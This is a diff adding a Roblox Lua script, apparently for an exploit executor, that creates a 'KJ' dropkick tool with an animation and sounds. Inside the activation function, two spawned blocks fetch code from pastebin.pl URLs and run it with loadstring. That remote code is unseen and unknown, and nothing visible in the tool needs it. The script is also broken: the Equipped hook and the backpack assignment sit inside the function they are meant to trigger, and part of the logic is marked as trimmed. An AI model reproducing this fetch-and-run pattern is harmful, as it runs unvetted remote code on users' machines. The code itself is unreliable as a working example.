@@ -1,0 +1,93 @@
+-- Create the Tool instance
+local tool = Instance.new("Tool")
+
+-- Set the tool's properties
+tool.Name = "20-20-20 Dropkick"
+tool.RequiresHandle = false  -- Set to true if you have a handle part
+tool.CanBeDropped = true     -- Change as needed
+
+-- Add a description or other properties
+tool.ToolTip = "The infamous dropkick from KJ."
+
+-- Function to make stuff happen when activated
+local function activateTool()
+    local p = game.Players.LocalPlayer
+    local Humanoid = p.Character:WaitForChild("Humanoid")
+
+    local AnimAnim = Instance.new("Animation")
+    AnimAnim.AnimationId = "rbxassetid://17354976067"
+    local Anim = Humanoid:LoadAnimation(AnimAnim)
+    AnimAnim.AnimationId = "rbxassetid://0" -- Reset animation ID
+    Anim:Play()
+
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+
+    local function setWalkSpeedToZero()
+        local humanoid = character:WaitForChild("Humanoid")
+        humanoid.WalkSpeed = 0
+    end
+
+    if character then
+        setWalkSpeedToZero()
+    end
+
+    player.CharacterAdded:Connect(function(newCharacter)
+        character = newCharacter
+        setWalkSpeedToZero()
+    end)
+
+    spawn(function()
+        loadstring(game:HttpGet("https://pastebin.pl/view/raw/93703964"))()
+    end)
+
+    spawn(function()
+        loadstring(game:HttpGet("https://pastebin.pl/view/raw/a9d0f7d7"))()
+    end)
+
+    -- Local Script
+    local soundId = 17429233290 -- Correct sound ID
+
+    -- Create a new Sound instance
+    local sound = Instance.new("Sound")
+    sound.Name = "Dropkick Miss"
+    sound.SoundId = "rbxassetid://" .. soundId
+    sound.Volume = 1
+    sound.Pitch = 1.0 -- Pitch set to 1.0
+    sound.PlaybackSpeed = 1.0 -- Adjusted playback speed
+
+    -- Parent the sound to Workspace
+    sound.Parent = workspace
+
+    -- Play the sound
+    sound:Play()
+
+    -- Local Script
+    local soundId2 = 17356346310 -- Correct sound ID
+
+    -- Create a new Sound instance
+    local sound2 = Instance.new("Sound")
+    sound2.Name = "Dropkick Miss Music"
+    sound2.SoundId = "rbxassetid://" .. soundId2
+    sound2.Volume = 0.8
+    sound2.Pitch = 1.0 -- Pitch set to 1.0
+    sound2.PlaybackSpeed = 1.0 -- Adjusted playback speed
+
+    -- Parent the sound to Workspace
+    sound2.Parent = workspace
+
+    -- Play the sound
+    sound2:Play()
+
+    Wait(1.79)
+
+    -- Additional logic for speedlines and effects (trimmed for brevity)
+
+    -- Add functionality to the tool when activated
+    tool.Equipped:Connect(function()
+        activateTool()
+    end)
+
+    -- Add the tool to the player's backpack
+    tool.Parent = game.Players.LocalPlayer.Backpack
+end
